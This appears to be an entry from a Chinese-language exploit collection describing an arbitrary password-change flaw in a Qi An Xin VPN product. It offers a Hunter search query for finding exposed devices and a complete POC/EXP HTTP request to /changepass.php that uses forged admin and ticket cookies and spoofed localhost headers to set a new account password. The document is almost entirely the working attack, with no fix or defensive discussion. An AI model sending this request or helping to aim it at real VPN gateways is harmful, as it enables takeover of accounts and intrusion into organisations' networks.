# 奇安信 VPN 任意账号密码修改漏洞

## 网络测绘

hunter: app.name="奇安信 VPN"

## POC / EXP

```
POST /changepass.php?type=2 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 
Content-Type: application/x-www-form-urlencoded
Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"anonymous","subAuthId":"1"}
Origin: 
Referer: /welcome.php
X-Forwarded-For: 127.0.0.1
X-Originating: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Content-Length: 69

old_pass=&password=Asd123%21%40%23123A&repassword=Asd123%21%40%23123A
```